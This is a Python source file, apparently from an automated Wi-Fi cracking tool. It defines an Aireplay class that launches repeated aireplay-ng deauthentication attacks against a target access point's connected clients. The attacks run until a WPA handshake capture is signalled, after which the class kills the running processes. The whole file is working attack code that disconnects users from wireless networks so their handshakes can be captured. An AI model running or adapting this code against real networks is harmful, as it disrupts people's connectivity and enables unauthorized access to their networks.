# -*- coding: utf-8 -*-
import logging
import traceback
from subprocess import Popen, PIPE, STDOUT
import shlex
from time import sleep
import signal
import os, sys
from multiprocessing import Process, Event
from pydispatch import dispatcher


import src.helpers as helpers
import src.items as items

SIGNAL_BSSID = 0
SIGNAL_CAPTURED = 1

class Aireplay(object):
    def __init__(self, items, dumps):
        self.items = items
        self._dumps = dumps

    def signal_handler(self, signum, frame):
        """
        handles signal if any Timeout signal comes.
        """
        if signum == signal.SIGALRM:
            logging.debug('Timeout signal has been sent.')
            raise Exception('Timeout')

    def handle_event(self, sign, sender, target_=None, interface_=None):
        """
        handles signal from airodump-ng
        if a monitoring is started to capture for specific AP sending SIGNAL_BSSID, 
        deauth attacks are started for it simultaneously
        if capturing process is succesful, airodump class sends another signal
        that SIGNAL_CAPTURED and deauth attacks are stopped. 
        """
        try:
            if sign == SIGNAL_BSSID:
                logging.debug(
                    'BSSID signal has been received: {}'.format(target_))

                self.attack_start(target_, interface_)

            elif sign == SIGNAL_CAPTURED:
                logging.debug(
                    'Captured signal has been received.')
                self.event.set()
                self.attack_stop()
            else:
                return
        except:
            raise
        return True

    def attack(self):
        """
        initializes dispatcher to handle events and
        terminates active aireplay-ng processes
        """
        try:
            self.attack_stop()

            dispatcher.connect(
                self.handle_event,
                sender=dispatcher.Any
                )

            self.event = Event()
        except:
            raise
        return True

    def attack_start(self, target, interface):
        """
        starts a new aireplay-ng process with given params 
        """
        try:
            for target_ in target['target']:
                logging.debug(
                    "attacking to {}".format(target_))

                self.attack_deauth(
                    count='5',
                    bssid=target['bssid'],
                    client=target_,
                    interface=interface)
        except:
            raise

    def attack_deauth(self, **kwargs):
        """
        arguments:
            count - sent # of deauth packet
            bssid - target AP bssid
            client - target client MAC address
            interface - monitor mode interface
        """
        def start_process(**kwargs):
            try:
                cmd = 'aireplay-ng'

                cmd += ' '.join(
                        (' -0', kwargs['count']))

                cmd += ' '.join(
                    (' -a', kwargs['bssid']))

                cmd += ' '.join(
                    (' -c', kwargs['client']))

                cmd += ''.join(
                    (' ', kwargs['interface']))

                logging.debug(
                    "Command is being executed: '{}'".format(cmd))
                command = shlex.split(cmd)

                try:
                    while True:
                        if self.event.is_set():
                            raise Exception("Captured")

                        proc = Popen(command, 
                                stdout=PIPE,
                                stderr=STDOUT,
                                )
                        proc.wait()
                        if proc.returncode > 0:
                            stdout, stderr = proc.communicate()
                            logging.error(
                                'ERROR: {} {}'.format(stdout, stderr))
                        sleep(2)
                except Exception as err:
                    if err.message == "Captured":
                        logging.debug(
                            "Deauth attack has been succesful. "
                            "Captured for: {}".format(kwargs['bssid']))
                    else:
                        raise
                finally:
                    self.attack_stop()
                return True
            except KeyError:
                raise Exception('Missing arguments!!')
            except:
                raise

        try:
            dispatcher.connect(
                self.handle_event,
                sender=dispatcher.Any
                )

            p = Process(target=start_process, kwargs=kwargs)
            p.start()
        except:
            raise

        return True

    def attack_stop(self):
        """
        stops any active 'aireplay-ng' attacks
        """
        timeout = 5

        signal.signal(signal.SIGALRM, self.signal_handler)

        signal.alarm(timeout)

        try:
            while True:
                active = self.is_active()
                if active is False:
                    break

                self.terminate(pids=active)

                sleep(0.5)
        except Exception as err:
            if err.message == 'Timeout':
                logging.debug(
                    "Previous 'aireplay-ng' execution "
                    "has not been terminated!")
        except:
            raise
        finally:
            signal.alarm(0)

        return True

    def is_active(self):
        """
        returns process id list of running aireplay-ng processes
        """
        cmd = 'pidof aireplay-ng'

        logging.debug(
            "Command is being executed: '{}'".format(cmd))
        command = shlex.split(cmd)
        try:
            proc = Popen(command, 
                stdout=PIPE, 
                stderr=STDOUT,)
            proc.wait()

            if proc.returncode is 0:
                pids = proc.communicate()[0].split(' ')
                return [ int(pid) for pid in pids ]
        except:
            raise

        return False

    def terminate(self, pids):
        """
        Sends SIGTERM to given processes
        """

        try:
            logging.debug(
                "SIGTERM has being sent for processes: {}".format(pids))
            for pid in pids:
                os.kill(pid, signal.SIGTERM)
        except:
            raise

        return False
                